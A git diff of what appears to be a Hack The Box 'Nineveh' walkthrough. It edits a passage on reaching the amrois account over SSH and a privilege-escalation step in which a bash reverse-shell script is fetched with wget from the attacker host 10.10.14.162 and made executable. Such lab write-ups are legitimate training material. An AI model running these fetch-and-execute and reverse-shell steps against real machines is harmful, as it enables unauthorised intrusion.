@@ -450,7 +450,7 @@ dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
 amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
 sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
 ```
-Additionally, I can see in amoris' directory, he has an .ssh directory with an authorized_keys file. At this point I figure I am looking for a way to enable external ssh access on the machine.
+Additionally, I can see in amoris' directory, he has an .ssh directory with an authorized_keys file. At this point I figure I am looking for a way to access this account via SSH.
 
 ### 7. Lateral movement
 
@@ -599,7 +599,6 @@ From previous experince doing a vulnhub machine (SickOS) I know there is a vulne
 Create bash reverse shell script, then wget it to the machine and give it execute perms.
 ```bash
 amrois@nineveh:/tmp$ wget http://10.10.14.162:8000/update && chmod +x update && echo "Done"
-<ttp://10.10.14.162:8000/update && chmod +x update && echo "Done"            
 --2020-12-18 06:24:28--  http://10.10.14.162:8000/update
 Connecting to 10.10.14.162:8000... connected.
 HTTP request sent, awaiting response... 200 OK
